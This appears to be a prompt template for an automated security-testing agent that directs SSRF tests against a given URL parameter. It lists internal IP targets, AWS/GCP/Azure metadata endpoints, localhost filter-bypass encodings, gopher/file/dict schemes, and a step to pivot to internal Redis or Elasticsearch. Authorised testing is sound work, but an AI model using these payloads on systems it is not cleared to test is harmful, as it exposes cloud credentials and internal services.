name: SSRF Testing
content:
Test SSRF vulnerabilities at {url} in parameter {parameter}.

Internal targets to test :
```
http://127.0.0.1
http://localhost
http://[::1]
http://169.254.169.254 (cloud metadata)
http://192.168.0.1
http://10.0.0.1
```

Cloud metadata endpoints :
- AWS: `http://169.254.169.254/latest/meta-data/`
- GCP: `http://metadata.google.internal/`
- Azure: `http://169.254.169.254/metadata/instance`

Filter bypass :
```
http://127.1
http://0x7f000001
http://2130706433
http://127.0.0.1.nip.io
```

Alternative protocols : `file://`, `gopher://`, `dict://`

If SSRF is confirmed, try accessing internal services (Redis, Elasticsearch, etc.).
